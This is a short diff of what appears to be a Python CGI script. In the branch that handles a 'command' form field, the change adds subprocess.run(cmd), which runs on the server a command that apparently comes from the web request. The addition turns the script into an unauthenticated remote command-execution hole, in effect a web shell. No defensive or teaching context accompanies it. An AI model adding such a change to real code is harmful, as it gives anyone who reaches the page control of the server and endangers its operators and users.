@@ -12,6 +12,7 @@ if "command" in form:
     print("Content-Type: text/html")
     print("")
     print(" ".join(cmd))
+    subprocess.run(cmd)
 else:
     print("Content-Type: text/html")
     print("")
